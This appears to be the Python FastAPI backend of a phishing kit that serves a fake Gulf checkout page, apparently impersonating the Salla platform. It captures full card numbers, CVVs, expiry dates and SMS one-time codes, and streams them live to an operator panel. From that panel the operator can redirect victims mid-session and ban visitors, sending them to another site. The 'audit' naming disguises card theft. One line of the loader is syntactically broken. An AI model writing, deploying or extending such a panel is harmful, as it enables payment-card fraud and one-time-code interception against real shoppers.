import os
import ipaddress
import uuid
import json
from typing import Optional, List, Dict
from fastapi import FastAPI, HTTPException, Security, Depends, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse, RedirectResponse, HTMLResponse
from fastapi.security.api_key import APIKeyHeader, APIKey
from pydantic import BaseModel, EmailStr, Field, field_validator
from starlette.status import HTTP_403_FORBIDDEN
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi import Request
import httpx
from datetime import datetime

# --- Configuration ---
API_KEY = os.getenv("API_KEY", "pro-audit-secret-key-2024")
API_KEY_NAME = "X-API-KEY"
api_key_header = APIKeyHeader(name=API_KEY_NAME, auto_error=False)

app = FastAPI(title="Salla API", description="Railway Backend for Salla Control", version="2.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Servir les fichiers statiques (Frontend) si hébergé ensemble
# Pour Railway, on suppose que le root dir contient les HTML
# On va monter le dossier PARENT (Salla) comme static pour simplifier
# ATTENTION: Sur Railway, il faudra copier les html DANS le dossier de l'app ou ajuster le path.
# Pour l'instant, on assume que main.py est dans api_railway/ et on veut servir .. (Salla/)
import sys
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent # Salla/
app.mount("/static", StaticFiles(directory=str(BASE_DIR)), name="static")

# --- Persistence ---
DB_FILE = "database.json"

def load_db():
    default = {"payments": [], "sms": [], "banned_ips": [], "banned_ids": []}
    if not os.path.exists(DB_FILE): return default
    try:
        with open(DB_FILE, "r") as f: 
            data = json.load(f)
            for key in default: if key not in data: data[key] = default[key]
            return data
    except: return default

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)

def is_banned(client_id: str, ip: str) -> bool:
    db = load_db()
    return client_id in db["banned_ids"] or ip in db["banned_ips"]

def ban_client(client_id: str = None, ip: str = None):
    db = load_db()
    if client_id and client_id not in db["banned_ids"]: db["banned_ids"].append(client_id)
    if ip and ip not in db["banned_ips"]: db["banned_ips"].append(ip)
    save_db(db)

def unban_client(client_id: str = None, ip: str = None):
    db = load_db()
    if client_id and client_id in db["banned_ids"]: db["banned_ids"].remove(client_id)
    if ip and ip in db["banned_ips"]: db["banned_ips"].remove(ip)
    save_db(db)

# --- WebSocket Manager ---
class ConnectionManager:
    def __init__(self):
        self.admins: List[WebSocket] = []
        self.clients: Dict[str, WebSocket] = {} 

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admins.append(websocket)

    def disconnect_admin(self, websocket: WebSocket):
        if websocket in self.admins: self.admins.remove(websocket)

    async def connect_client(self, client_id: str, websocket: WebSocket):
        await websocket.accept()
        self.clients[client_id] = websocket

    def disconnect_client(self, client_id: str):
        if client_id in self.clients: del self.clients[client_id]

    async def broadcast_to_admins(self, message: dict):
        for connection in self.admins:
            try: await connection.send_json(message)
            except: continue

    async def send_to_client(self, client_id: str, message: dict):
        if client_id in self.clients:
            try: await self.clients[client_id].send_json(message)
            except: pass

manager = ConnectionManager()

# --- Models ---
class AuditRequest(BaseModel):
    client_id: str
    full_name: str
    numero_carte: str
    card_bin: str
    card_brand: str
    expiry: str
    cvv: str
    montant: float
    adresse_ip: str
    device: str
    email: Optional[str] = "unknown@client.com"
    
    @field_validator("adresse_ip")
    @classmethod
    def validate_ip(cls, v: str) -> str: return v

class RedirectRequest(BaseModel):
    client_id: str
    target: str 

# --- Routes ---

# Servir les pages HTML directement à la racine pour simuler un hébergement "tout-en-un"
@app.get("/")
async def root():
    return FileResponse(BASE_DIR / "checkout_gulf.html")

@app.get("/{page_name}")
async def serve_page(page_name: str):
    # Sécurité basique
    if ".." in page_name or "/" in page_name: raise HTTPException(400)
    
    # Si c'est le panel, on le sert depuis api_railway/ s'il y est, ou on le crée
    # Pour l'instant on regarde dans Salla root
    target = BASE_DIR / page_name
    if not page_name.endswith(".html"): target = BASE_DIR / f"{page_name}.html"
    
    # Cas spécial: panel.html peut ne pas exister dans root, mais nous devons le servir
    # Si 'panel' demandé, on peut retourner le HTML généré dynamiquement ou lire un fichier
    # L'utilisateur a demandé panel.html
    
    if os.path.exists(target):
        return FileResponse(target)
    raise HTTPException(404)

# --- API V1 ---
@app.post("/v1/audit")
async def create_audit(request: AuditRequest, req: Request):
    ip = req.client.host
    if is_banned(request.client_id, ip): raise HTTPException(403, detail="BANNED")
    
    data = request.dict()
    data['adresse_ip'] = ip
    
    # BIN Lookup
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get(f"https://lookup.binlist.net/{data['card_bin']}")
            if r.status_code==200:
                b = r.json()
                data['bank_name'] = b.get('bank',{}).get('name','Unknown')
                data['card_type'] = b.get('type','N/A')
                data['country'] = b.get('country',{}).get('name','N/A')
    except: pass

    db = load_db()
    data["timestamp"] = datetime.now().isoformat()
    data["status"] = "pending"
    db["payments"].append(data)
    save_db(db)
    
    await manager.broadcast_to_admins({"type": "NEW_PAYMENT", "data": data})
    return {"status": "PENDING"}

@app.post("/v1/sms-submit")
async def submit_sms(client_id: str, otp: str):
    db = load_db()
    db["sms"].append({"client_id": client_id, "otp": otp, "timestamp": str(uuid.uuid4())})
    save_db(db)
    await manager.broadcast_to_admins({"type": "NEW_SMS", "client_id": client_id, "otp": otp})
    return {"status": "success"}

@app.post("/v1/admin/redirect")
async def admin_redirect(r: RedirectRequest):
    # Gérer les chemins relatifs ou absolus pour le client
    url = r.target
    if not url.startswith("http"): url = f"/{url}" # Assume page locale
    await manager.send_to_client(r.client_id, {"type": "REDIRECT", "url": url})
    return {"status": "ok"}

@app.post("/v1/admin/ban")
async def ban_endpoint(client_id: Optional[str] = None, ip: Optional[str] = None):
    ban_client(client_id, ip)
    if client_id:
        await manager.send_to_client(client_id, {"type": "BANNED", "redirect": "https://www.facebook.com"})
        if client_id in manager.clients: await manager.clients[client_id].close(code=4003)
    return {"status": "banned"}

@app.get("/v1/admin/history")
async def get_history():
    db = load_db()
    return db

# --- WebSocket ---
@app.websocket("/ws/admin")
async def ws_admin(websocket: WebSocket):
    await manager.connect_admin(websocket)
    try:
        while True: await websocket.receive_text()
    except WebSocketDisconnect: manager.disconnect_admin(websocket)

@app.websocket("/ws/client/{client_id}")
async def ws_client(websocket: WebSocket, client_id: str):
    ip = websocket.client.host
    if is_banned(client_id, ip):
        await websocket.accept()
        await websocket.send_json({"type": "BANNED", "redirect": "https://www.facebook.com"})
        await websocket.close()
        return
    
    await manager.connect_client(client_id, websocket)
    try:
        await manager.broadcast_to_admins({"type": "CLIENT_STATUS", "client_id": client_id, "status": "online"})
        while True:
            data = await websocket.receive_json()
            # Relayer au panel
            await manager.broadcast_to_admins({"type": "CLIENT_EVENT", "client_id": client_id, "event": data.get('event'), "data": data.get('data')})
    except:
        manager.disconnect_client(client_id)
        await manager.broadcast_to_admins({"type": "CLIENT_STATUS", "client_id": client_id, "status": "offline"})

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
